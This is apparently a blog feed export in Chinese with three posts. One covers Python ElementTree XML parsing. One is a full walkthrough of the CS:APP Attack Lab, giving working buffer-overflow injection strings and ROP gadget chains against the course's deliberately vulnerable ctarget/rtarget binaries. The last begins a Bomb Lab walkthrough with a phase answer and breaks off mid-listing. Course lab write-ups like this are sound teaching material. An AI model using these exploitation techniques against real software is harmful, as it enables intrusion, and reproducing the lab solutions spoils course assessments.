      <url>2018/12/09/python-elementtree-shu-ju-qing-xi/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>XML 是一种可扩展标记语言，被用来传输和存储数据。它是一种有逻辑的树结构。</p><h2 id="Python-使用-xml-ElementTree-解析"><a href="#Python-使用-xml-ElementTree-解析" class="headerlink" title="Python 使用 xml.ElementTree 解析"></a>Python 使用 xml.ElementTree 解析</h2><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> xml.etree.ElementTree <span class="keyword">as</span> ET</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">import</span> json</span><br></pre></td></tr></tbody></table></figure><p>codecs 用于打开文件，json 用于保存清洗完的数据。</p><a id="more"></a><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tree = ET.parse()<span class="comment">#获取目录树</span></span><br><span class="line">root = tree.getroot() <span class="comment">#得到树根</span></span><br><span class="line">root = ET.fromstring()<span class="comment">#从字符串直接解析出树根</span></span><br></pre></td></tr></tbody></table></figure><p>获取树根，然后进行操作</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root.tag<span class="comment">#root元素的标记名</span></span><br><span class="line">root.attrib<span class="comment">#root元素的属性，为一个dic</span></span><br><span class="line"><span class="keyword">for</span> child <span class="keyword">in</span> root:<span class="comment">#便利子元素</span></span><br><span class="line">print(child.tag, child.attrib)</span><br><span class="line">root[<span class="number">0</span>][<span class="number">1</span>].text <span class="comment">#将元素视为多维数组,用下标访问</span></span><br><span class="line">root.find(<span class="string">"element"</span>).text <span class="comment">#找出root下element下的内容字符串</span></span><br><span class="line">title = root.get(<span class="string">"Title"</span>) <span class="comment">#获取root元素的title属性</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> neighbor <span class="keyword">in</span> root.iter(<span class="string">'neighbor'</span>):<span class="comment">#遍历所有特定元素,递归到所有，子、孙...元素</span></span><br><span class="line">print(neighbor.attrib)</span><br><span class="line"><span class="keyword">for</span> country <span class="keyword">in</span> root.findall(<span class="string">'country'</span>):<span class="comment">#找出所有country元素，仅子代</span></span><br><span class="line">     rank = country.find(<span class="string">'rank'</span>).text</span><br><span class="line">     name = country.get(<span class="string">'name'</span>)</span><br><span class="line">     print(name, rank)</span><br><span class="line"><span class="keyword">for</span> country <span class="keyword">in</span> root.find(<span class="string">'country'</span>):<span class="comment">#仅找出第一个符合的子代</span></span><br></pre></td></tr></tbody></table></figure><h1 id="其他涉及知识"><a href="#其他涉及知识" class="headerlink" title="其他涉及知识"></a>其他涉及知识</h1><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mkdir</span><span class="params">(path)</span>:</span><span class="comment">#创建文件夹</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path):</span><br><span class="line">        os.mkdir(path)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> son_path <span class="keyword">in</span> os.listdir(root_path):<span class="comment">#遍历root_path下的文件</span></span><br><span class="line"></span><br><span class="line">json.dump(dic, file_obj, ensure_ascii=<span class="literal">False</span>, indent=<span class="number">4</span>, separators=(<span class="string">','</span>, <span class="string">': '</span>))<span class="comment">#将字典dic输出到文件file_obj中,不对ascii进行编码,缩进4,分隔符为','以及': '</span></span><br></pre></td></tr></tbody></table></figure><h1 id="暂时到此"><a href="#暂时到此" class="headerlink" title="暂时到此"></a>暂时到此</h1><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据清洗 </tag>
            
            <tag> ElementTree </tag>
            
            <tag> XML </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CS:APP Attack_lab</title>
      <link href="2018/12/08/cs-app-attack-lab/"/>
      <url>2018/12/08/cs-app-attack-lab/</url>
      
        <content type="html"><![CDATA[<h1 id="实验描述"><a href="#实验描述" class="headerlink" title="实验描述"></a>实验描述</h1><p>本次实验利用程序需要外部输入的特点，输入机器码对程序返回值覆盖，以达到攻击的目的，即在getbuf函数需要的输入中做手脚，以致不能正常返回，执行攻击代码。</p><h1 id="第一阶段"><a href="#第一阶段" class="headerlink" title="第一阶段"></a>第一阶段</h1><p>第一阶段中栈随机化未开机，可以得知内存位置的确切地址，且栈中机器码可执行。</p><p>那么我们将需要执行的操作码和地址输入机器码即可。</p><a id="more"></a><h2 id="phase-1"><a href="#phase-1" class="headerlink" title="phase_1"></a>phase_1</h2><p>第一关非常简单，题目主要我们在getbuf执行完成后执行touch1,touch1()无参。</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disas getbuf </span><br><span class="line">Dump of assembler code for function getbuf:</span><br><span class="line">   0x0000000000401688 &lt;+0&gt;:sub    $0x18,%rsp</span><br><span class="line">   0x000000000040168c &lt;+4&gt;:mov    %rsp,%rdi</span><br><span class="line">   0x000000000040168f &lt;+7&gt;:callq  0x4018ca &lt;Gets&gt;</span><br><span class="line">   0x0000000000401694 &lt;+12&gt;:mov    $0x1,%eax</span><br><span class="line">   0x0000000000401699 &lt;+17&gt;:add    $0x18,%rsp</span><br><span class="line">   0x000000000040169d &lt;+21&gt;:retq   </span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) disas touch1</span><br><span class="line">Dump of assembler code for function touch1:</span><br><span class="line">   0x00000000004016a0 &lt;+0&gt;:sub    $0x8,%rsp</span><br><span class="line">   0x00000000004016a4 &lt;+4&gt;:movl   $0x1,0x2029ee(%rip)        # 0x60409c &lt;vlevel&gt;</span><br><span class="line">   0x00000000004016ae &lt;+14&gt;:mov    $0x402e4e,%edi</span><br><span class="line">   0x00000000004016b3 &lt;+19&gt;:callq  0x400bd0 &lt;puts@plt&gt;</span><br><span class="line">   0x00000000004016b8 &lt;+24&gt;:mov    $0x1,%edi</span><br><span class="line">   0x00000000004016bd &lt;+29&gt;:callq  0x401ab5 &lt;validate&gt;</span><br><span class="line">   0x00000000004016c2 &lt;+34&gt;:mov    $0x0,%edi</span><br><span class="line">   0x00000000004016c7 &lt;+39&gt;:callq  0x400d60 &lt;exit@plt&gt;</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></tbody></table></figure><p>可以看到，getbuf开出了0x18，即24字节的空间，touch1的地址为0x4016a0。那么我们只需填满这0x28空间，再以touch1地址替代返回值。注意：x86-64机器中，采用小端法，其低位字节存放在低地址，故我们输入数据时，先输入低位。</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">a0 16 40 00 00 00 00 00</span><br></pre></td></tr></tbody></table></figure><p>转换后输入即可</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Cookie: 0x63149380</span><br><span class="line">Type string:Touch1!: You called touch1()</span><br><span class="line">Valid solution <span class="keyword">for</span> level 1 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">user id2017211523</span><br><span class="line">coursef18</span><br><span class="line">labattacklab</span><br><span class="line">result117:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 A0 16 40 00 00 00 00 00</span><br></pre></td></tr></tbody></table></figure><h2 id="phase-2"><a href="#phase-2" class="headerlink" title="phase_2"></a>phase_2</h2><p>第二关根据题意，需要调用touch2，需要传递一个无符号整数值，其值为cookie，查看cookie文件，如下。</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2017211523@bupt3:~/target117$ cat cookie.txt </span><br><span class="line">0x63149380</span><br></pre></td></tr></tbody></table></figure><p>为了给touch2传参，我们需要将cookie值赋给%rdi，然后将touch2地址压栈，使用ret弹出touch2地址返回，调用touch2。</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov     $0x63149380,%rdi</span><br><span class="line">pushq   $0x4016cc</span><br><span class="line">ret</span><br></pre></td></tr></tbody></table></figure><p>将其编译为二进制之后在反汇编，得到如下，由此我们便知指令的机器码是多少。</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">phase2.o:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:   48 c7 c7 80 93 14 63    mov    $0x63149380,%rdi</span><br><span class="line">   7:   68 cc 16 40 00          pushq  $0x4016cc</span><br><span class="line">   c:   c3                      retq</span><br></pre></td></tr></tbody></table></figure><p>我们将指令的机器码放在getbuf时的栈顶，然后将返回值位置设置为栈顶地址，这样既可达到目的，调用getbuf时栈顶地址为0x5566f7a8。</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 80 93 14 63 68</span><br><span class="line">cc 16 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">a8 f7 66 55 00 00 00 00</span><br></pre></td></tr></tbody></table></figure><p>输入运行。</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">2017211523@bupt3:~/target117$ ./hex2raw &lt; phase2 | ./ctarget -q</span><br><span class="line">Cookie: 0x63149380</span><br><span class="line">Type string:Touch2!: You called touch2(0x63149380)</span><br><span class="line">Valid solution <span class="keyword">for</span> level 2 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">user id2017211523</span><br><span class="line">coursef18</span><br><span class="line">labattacklab</span><br><span class="line">result117:PASS:0xffffffff:ctarget:2:48 C7 C7 80 93 14 63 68 CC 16 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 A8 F7 66 55 00 00 00 00</span><br></pre></td></tr></tbody></table></figure><h2 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h2><p>查看touch3</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch3</span><span class="params">(<span class="keyword">char</span> *sval)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">vlevel = <span class="number">3</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line"><span class="keyword">if</span> (hexmatch(cookie, sval)) {</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Touch3!: You called touch3(\"%s\")\n"</span>, sval);</span><br><span class="line">validate(<span class="number">3</span>);</span><br><span class="line">} <span class="keyword">else</span> {</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Misfire: You called touch3(\"%s\")\n"</span>, sval);</span><br><span class="line">fail(<span class="number">3</span>);</span><br><span class="line">}</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>可知其需要一个指向字符的指针sval，然后调用hexmatch，将cookie和sval作为参数传入，需要hexomatch返回非零值。</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hexmatch</span><span class="params">(<span class="keyword">unsigned</span> val, <span class="keyword">char</span> *sval)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line">    <span class="comment">/* Make position of check string unpredictable */</span></span><br><span class="line">    <span class="keyword">char</span> *s = cbuf + random() % <span class="number">100</span>;</span><br><span class="line">    <span class="built_in">sprintf</span>(s, <span class="string">"%.8x"</span>, val);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>由hexmatch可知，其比较cookie的字符串表示与传入的字符串是否相等，相等则返回1，那么问题明了，我们需要将表示cookie的字符串地址传给touch3，与第二题不同的是字符串需要有空间保存，我们需要在栈中找出调用hexmatch时候未被重写改变的空间，借以保存字符串。</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov     $0x5566f7c8,%rdi</span><br><span class="line">pushq   $0x4017a0</span><br><span class="line">ret</span><br></pre></td></tr></tbody></table></figure><p>这里我们将cookie的字符串表示放在0x5566f7c8，编译再反汇编得到机器码</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">phase3.o:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:   48 c7 c7 c8 f7 66 55    mov    $0x5566f7c8,%rdi</span><br><span class="line">   7:   68 a0 17 40 00          pushq  $0x4017a0</span><br><span class="line">   c:   c3                      retq</span><br></pre></td></tr></tbody></table></figure><p>查表得出cookie字符串的16进制表示为36 33 31 34 39 33 38  30，注意：以字符串形势比较时不用再反转输入，且字符串应有结尾字符‘\0’，得到攻击字符串如下</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 c8 f7 66 55 68</span><br><span class="line">a0 17 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">a8 f7 66 55 00 00 00 00</span><br><span class="line">36 33 31 34 39 33 38 30</span><br><span class="line">00</span><br></pre></td></tr></tbody></table></figure><p>转换输入运行</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">2017211523@bupt3:~/target117$ ./hex2raw &lt; phase3 | ./ctarget -q</span><br><span class="line">Cookie: 0x63149380</span><br><span class="line">Type string:Touch3!: You called touch3(<span class="string">"63149380"</span>)</span><br><span class="line">Valid solution <span class="keyword">for</span> level 3 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">user id2017211523</span><br><span class="line">coursef18</span><br><span class="line">labattacklab</span><br><span class="line">result117:PASS:0xffffffff:ctarget:3:48 C7 C7 C8 F7 66 55 68 A0 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 A8 F7 66 55 00 00 00 00 36 33 31 34 39 33 38 30 00</span><br></pre></td></tr></tbody></table></figure><h1 id="第二阶段"><a href="#第二阶段" class="headerlink" title="第二阶段"></a>第二阶段</h1><p>在此阶段，程序添加了两个现代计算机程序几乎必须的对抗缓缓冲区溢出攻击的措施：  </p><p>1.函数栈随机化 ，无法再获取绝对地址。  </p><p>2.栈内存的内容被锁定为不可执行。  </p><p>故此，我们需要使用ROP(面向返回编程)，即使用程序中本来就存在的代码组成我们需要的操作，再将其地址作为返回值，不断用ret指令返回完成所需操作。</p><h2 id="phase-4"><a href="#phase-4" class="headerlink" title="phase_4"></a>phase_4</h2><p>此关需用ROP方法完成phase_2内容。那么就需要在操作中得到cookie值，那么只有用pop指令了，需要指令为。</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">popq %rax</span><br><span class="line">movq%rax,%rdi</span><br><span class="line">ret</span><br></pre></td></tr></tbody></table></figure><p>查找官方的write up，得知对应机器码，然后在在rtarget文件的反汇编文件中利用vim查找对应代码地址。将其放入攻击字符串，得到攻击字符串为。  </p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">3c 18 40 00 00 00 00 00/*popq rax*/</span><br><span class="line">80 93 14 63 00 00 00 00/*cookie*/</span><br><span class="line">49 18 40 00 00 00 00 00/*movq %rax,%rdi */</span><br><span class="line">cc 16 40 00 00 00 00 00 /*touch2*/</span><br></pre></td></tr></tbody></table></figure><p>转换输入运行</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">2017211523@bupt3:~/target117$ ./hex2raw &lt; phase4 | ./rtarget </span><br><span class="line">Cookie: 0x63149380</span><br><span class="line">Type string:Touch2!: You called touch2(0x63149380)</span><br><span class="line">Valid solution <span class="keyword">for</span> level 2 with target rtarget</span><br><span class="line">PASS: Sent exploit string to server to be validated.</span><br><span class="line">NICE JOB!</span><br></pre></td></tr></tbody></table></figure><h2 id="phase-5"><a href="#phase-5" class="headerlink" title="phase_5"></a>phase_5</h2><p>此关为phase_3的ROP版本，我们需要查找start_farm到end_farm中的gadgets，拼凑出代码实现phase_3中插入代码的功能。还需注意：  </p><p>1.0x90代表nop，除了将pc加1之外不做任何事。  </p><p>2.不分双字节指令，设置标志位，不改变寄存器的值，可以使用。 </p><p>需要的指令有</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">movq%rsp,%rax</span><br><span class="line">movq%rax,%rdi</span><br><span class="line">popq%rax</span><br><span class="line">movl%eax,%ecx</span><br><span class="line">movl%ecx,%edx</span><br><span class="line">movl%edx,%esi</span><br><span class="line">lea(%rdi, %rsi, 1),%rax</span><br><span class="line">movq%rax,%rdi</span><br></pre></td></tr></tbody></table></figure><p>则攻击字符串为</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">bd 18 40 00 00 00 00 00/*gadget1*/</span><br><span class="line">49 18 40 00 00 00 00 00/*gadget2*/</span><br><span class="line">30 18 40 00 00 00 00 00/* gadget3*/</span><br><span class="line">48 00 00 00 00 00 00 00/*cookie字符串偏移量*/</span><br><span class="line">13 19 40 00 00 00 00 00/*gadget4*/</span><br><span class="line">ca 18 40 00 00 00 00 00/*gadget5*/</span><br><span class="line">b7 18 40 00 00 00 00 00/*gadget6*/</span><br><span class="line">69 18 40 00 00 00 00 00/*gadget7*/</span><br><span class="line">49 18 40 00 00 00 00 00/*gadget8*/</span><br><span class="line">a0 17 40 00 00 00 00 00 /*touch3地址      */</span><br><span class="line">36 33 31 34 39 33 38 30 /* cookie字符串  */</span><br><span class="line">00</span><br></pre></td></tr></tbody></table></figure><p>转换文件运行</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">2017211523@bupt3:~/target117$ ./hex2raw &lt; phase5 | ./rtarget </span><br><span class="line">Cookie: 0x63149380</span><br><span class="line">Type string:Touch3!: You called touch3(<span class="string">"63149380"</span>)</span><br><span class="line">Valid solution <span class="keyword">for</span> level 3 with target rtarget</span><br><span class="line">PASS: Sent exploit string to server to be validated.</span><br><span class="line">NICE JOB!</span><br></pre></td></tr></tbody></table></figure><h1 id="到此为止"><a href="#到此为止" class="headerlink" title="到此为止"></a>到此为止</h1><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CS:APP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CS:APP </tag>
            
            <tag> 汇编 </tag>
            
            <tag> 代码注入攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CS:APP Bomb_lab</title>
      <link href="2018/12/01/cs-app-bomb-lab/"/>
      <url>2018/12/01/cs-app-bomb-lab/</url>
      
        <content type="html"><![CDATA[<h1 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h1><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>使用<code>tar -vxf</code>将炸弹压缩包解压,cd进入,可以从bomb.c中看出实验的用意以及程序的大致<br>逻辑,bomb为可执行程序,使用gdb调试该程序.</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(gdb) b read_line </span><br><span class="line">Breakpoint 1 at 0x40155c</span><br><span class="line">(gdb) b explode_bomb </span><br><span class="line">Breakpoint 2 at 0x4014e4</span><br></pre></td></tr></tbody></table></figure><p>给read_line函数打上断点,以便每次输入运行一关.给explode_bomb打上断点,以便在炸弹爆炸<br>前可以处理.</p><h2 id="phase-1"><a href="#phase-1" class="headerlink" title="phase_1"></a>phase_1</h2><p>获得phase_1汇编代码</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disas phase_1</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> phase_1:</span><br><span class="line">   0x0000000000400e80 &lt;+0&gt;:sub    <span class="variable">$0x8</span>,%rsp</span><br><span class="line">   0x0000000000400e84 &lt;+4&gt;:mov    <span class="variable">$0x4024a0</span>,%esi</span><br><span class="line">   0x0000000000400e89 &lt;+9&gt;:callq  0x40127e &lt;strings_not_equal&gt;</span><br><span class="line">   0x0000000000400e8e &lt;+14&gt;:<span class="built_in">test</span>   %eax,%eax</span><br><span class="line">   0x0000000000400e90 &lt;+16&gt;:je     0x400e97 &lt;phase_1+23&gt;</span><br><span class="line">   0x0000000000400e92 &lt;+18&gt;:callq  0x4014e4 &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000400e97 &lt;+23&gt;:add    <span class="variable">$0x8</span>,%rsp</span><br><span class="line">   0x0000000000400e9b &lt;+27&gt;:retq   </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></tbody></table></figure><p>可见,此题是将我们输入的字符串与地址0x4024a0处字符串比较,不等则爆炸.查看该字符串.</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/s 0x4024a0</span><br><span class="line">0x4024a0 &lt;__dso_handle+344&gt;: <span class="string">"We have to stand with our North Korean allies."</span></span><br></pre></td></tr></tbody></table></figure><p>那么答案是We have to stand with our North Korean allies.</p><a id="more"></a><h2 id="phase-2"><a href="#phase-2" class="headerlink" title="phase_2"></a>phase_2</h2><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disas phase_2</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> phase_2:</span><br><span class="line">   0x0000000000400e9c &lt;+0&gt;:push   %rbp</span><br><span class="line">   0x0000000000400e9d &lt;+1&gt;:push   %rbx</span><br><span class="line">   0x0000000000400e9e &lt;+2&gt;:sub    <span class="variable">$0x28</span>,%rsp</span><br><span class="line">   0x0000000000400ea2 &lt;+6&gt;:mov    %rsp,%rsi</span><br><span class="line">   0x0000000000400ea5 &lt;+9&gt;:callq  0x40151a &lt;read_six_numbers&gt;</span><br><span class="line">   0x0000000000400eaa &lt;+14&gt;:cmpl   <span class="variable">$0x1</span>,(%rsp)</span><br><span class="line">   0x0000000000400eae &lt;+18&gt;:je     0x400ed0 &lt;phase_2+52&gt;</span><br><span class="line">   0x0000000000400eb0 &lt;+20&gt;:callq  0x4014e4 &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000400eb5 &lt;+25&gt;:jmp    0x400ed0 &lt;phase_2+52&gt;</span><br><span class="line">   0x0000000000400eb7 &lt;+27&gt;:mov    -0x4(%rbx),%eax</span><br><span class="line">   0x0000000000400eba &lt;+30&gt;:add    %eax,%eax</span><br><span class="line">   0x0000000000400ebc &lt;+32&gt;:cmp    %eax,(%rbx)</span><br><span class="line">   0x0000000000400ebe &lt;+34&gt;:je     0x400ec5 &lt;phase_2+41&gt;</span><br><span class="line">   0x0000000000400ec0 &lt;+36&gt;:callq  0x4014e4 